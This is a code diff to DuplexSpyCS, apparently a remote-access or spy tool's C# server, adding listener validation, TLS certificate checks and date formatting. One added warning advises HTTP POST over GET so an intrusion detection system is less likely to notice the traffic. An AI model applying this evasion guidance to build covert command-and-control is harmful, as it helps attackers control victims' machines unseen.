@@ -7,6 +7,7 @@ using System.Data.SQLite;
 using System.Data;
 using System.Data.Entity.Migrations.Model;
 using System.Xml.Linq;
+using System.Globalization;
 
 namespace DuplexSpyCS
 {
@@ -111,10 +112,13 @@ namespace DuplexSpyCS
             if (!File.Exists(db_file))
             {
                 DialogResult dr = MessageBox.Show(
-                    $"Cannot find database file: {db_file}\nDo you want to open exists file?",
+                    $"Cannot find database file: {db_file}\n" +
+                    $"Do you want to open exists file?\n" +
+                    $"Click \"No\" to create a new database file.",
                     "File not exists",
                     MessageBoxButtons.YesNo,
-                    MessageBoxIcon.Warning
+                    MessageBoxIcon.Warning,
+                    MessageBoxDefaultButton.Button2
                     );
 
                 if (dr == DialogResult.Yes)
@@ -632,10 +636,50 @@ namespace DuplexSpyCS
             foreach (var l in ls)
             {
                 if (int.Equals(config.nPort, l.nPort) && !string.Equals(config.szName, l.szName))
-                {
-                    MessageBox.Show($"Port[{config.nPort}] is assigned for Listener[{l.szName}]", "fnbSaveListenerValidate()", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return false;
-                }
+                    throw new Exception($"Port[{config.nPort}] is assigned for Listener[{l.szName}]");
+            }
+
+            if (config.enProtocol == enListenerProtocol.TLS)
+            {
+                if (string.IsNullOrEmpty(config.szCertPath))
+                    throw new Exception("Certificate path is null or empty.");
+
+                if (!File.Exists(config.szCertPath))
+                    throw new Exception("Cannot find certificate file: " + config.szCertPath);
+
+                if (string.IsNullOrEmpty(config.szCertPassword))
+                    MessageBox.Show("You certificate password is null or empty. It might cause security issues, but the server still runs.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+            else if (config.enProtocol == enListenerProtocol.HTTP)
+            {
+                if (config.httpMethod == enHttpMethod.GET)
+                    MessageBox.Show(
+                        "HTTP GET is specified. Current version constructs the HTTP packet with appending the message to the HTTP request body.\n" +
+                        "The IDS (Intrusive Detection System) or packet analyzer might notice this abnormal HTTP request packet format.\n" +
+                        "HTTP POST method is recommended.",
+                        "Warning",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Warning
+                    );
+
+                if (string.IsNullOrEmpty(config.szHttpPath))
+                    MessageBox.Show("You HTTP resource path is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+                if (string.IsNullOrEmpty(config.szContentType))
+                    MessageBox.Show("Content-Type is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+                if (string.IsNullOrEmpty(config.szHttpUA))
+                    MessageBox.Show("User-Agent is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+                if (string.IsNullOrEmpty(config.szHttpHost))
+                    MessageBox.Show("HTTP host is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+                if (string.IsNullOrEmpty(config.szBody))
+                    MessageBox.Show("HTTP response body is null or empty.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            }
+            else
+            {
+                throw new Exception($"Unknown protocol: {config.enProtocol.ToString()}");
             }
 
             return true;
@@ -655,7 +699,7 @@ namespace DuplexSpyCS
                         $"\"Protocol\"=\"{config.enProtocol}\"," +
                         $"\"Port\"=\"{config.nPort}\"," +
                         $"\"Description\"=\"{config.szDescription}\"," +
-                        $"\"CreationDate\"=\"{config.dtCreationDate.ToString("F")}\"," +
+                        $"\"CreationDate\"=\"{config.dtCreationDate.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture)}\"," +
                         
                         $"\"CertPath\"=\"{config.szCertPath}\"," +
                         $"\"CertPassword\"=\"{config.szCertPassword}\"," +
@@ -680,7 +724,7 @@ namespace DuplexSpyCS
                         $"\"{config.enProtocol}\"," +
                         $"\"{config.nPort} \"," +
                         $"\"{config.szDescription}\"," +
-                        $"\"{config.dtCreationDate.ToString("F")}\"," +
+                        $"\"{config.dtCreationDate.ToString("yyyy-MM-dd HH:mm", CultureInfo.InvariantCulture)}\"," +
                         
                         $"\"{config.szCertPath}\"," +
                         $"\"{config.szCertPassword}\"," +
